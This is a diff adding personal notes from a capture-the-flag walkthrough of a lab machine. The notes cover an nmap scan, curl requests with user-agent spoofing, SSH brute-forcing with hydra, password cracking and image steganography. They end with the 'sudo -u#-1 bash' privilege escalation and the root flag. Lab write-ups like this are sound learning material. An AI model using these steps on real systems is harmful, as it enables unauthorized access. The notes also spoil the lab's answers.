@@ -1,0 +1,118 @@
+Agent-SUdo
+
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-05 10:08 -0300
+Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 98.60% done; ETC: 10:09 (0:00:00 remaining)
+Nmap scan report for 10.67.190.210
+Host is up (0.12s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
+|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
+|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Annoucement
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.62 seconds
+
+curl -s -A 'R' http://10.67.190.210/
+What are you doing! Are you one of the 25 employees? If not, I going to report this incident
+<!DocType html>
+<html>
+<head>
+	<title>Annoucement</title>
+</head>
+
+<body>
+<p>
+	Dear agents,
+	<br><br>
+	Use your own <b>codename</b> as user-agent to access the site.
+	<br><br>
+	From,<br>
+	Agent R
+</p>
+</body>
+</html>
+
+Had to look up what was user-agent... and the options of curl
+curl -L -A 'C' http://10.66.133.46/
+Attention chris, <br><br>
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>
+
+From,<br>
+Agent R 
+
+
+His name is chris, his password is weak, I could use hydra to bust in to SSH.
+
+crystal is his password
+
+got 3 files
+
+cat To_agentJ.txt
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+
+From,
+Agent C
+
+
+There is a hidden msg behind the pictture.
+Used strings, found something like To_agentR.txt??
+
+
+Used Aperisolve to see hidden message in cutie.png
+Extracted the message.
+found the hash of zip using zip2john
+found the password using john
+passwd: alien
+
+found To_agentR.txt
+
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+
+What is QXJlYTUx??? Sounds like an username? might be a password?
+
+might be for the other image?
+
+Looked like cryptography, soo I broke it using base64
+Area51, is it the username or password?
+
+Used it to extract cute-alien.jpg!
+
+got message.txt
+
+Hi james,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+
+Agent J name is james, with password hackerrules. Gonna use it for ssh.
+Didn't work, because the dumbbass here forgot the '!'
+
+did sudo -l
+there is a vulnerability, had to search it.
+did sudo -u#-1 bash
+got root
+cd /root/
+cat root.txt
+
+b53a02f55b57d4439e3341834d70c062
